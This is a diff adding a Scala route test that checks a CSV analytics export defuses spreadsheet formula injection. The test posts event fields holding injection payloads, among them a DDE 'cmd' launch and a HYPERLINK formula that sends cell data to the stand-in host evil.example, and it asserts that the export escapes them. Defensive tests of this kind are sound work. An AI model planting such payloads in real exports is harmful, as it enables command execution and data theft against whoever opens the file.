@@ -205,3 +205,29 @@ class RoutesSpec extends AnyFlatSpec with Matchers with ScalatestRouteTest with 
       csv should include("document.created")
     }
   }
+
+  it should "neutralize spreadsheet formulas planted through tracked events" in {
+    val (eventRoutes, analyticsRoutes, _) = createRoutes()
+    val routes = concat(eventRoutes.routes, analyticsRoutes.routes)
+    val payload = TrackEventRequest(
+      eventType = "+document.created",
+      userId = "=cmd|' /C calc'!A0",
+      resourceId = "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"open\")",
+      resourceType = "@SUM(1+1)",
+      metadata = None
+    ).toJson.compactPrint
+
+    Post("/api/v1/analytics/events", HttpEntity(ContentTypes.`application/json`, payload)) ~> routes ~> check {
+      status shouldBe StatusCodes.Accepted
+    }
+
+    Get("/api/v1/analytics/export?format=csv&period=7d") ~> routes ~> check {
+      status shouldBe StatusCodes.OK
+      val row = responseAs[String].split("\n")(1)
+      row should include(",'+document.created,'=cmd|' /C calc'!A0,")
+      row should include(",\"'=HYPERLINK(\"\"http://evil.example/?d=\"\"&A1,\"\"open\"\")\",'@SUM(1+1),")
+      row.split(",").foreach { cell =>
+        cell.headOption.foreach(c => "=+-@".toSet should not contain c)
+      }
+    }
+  }
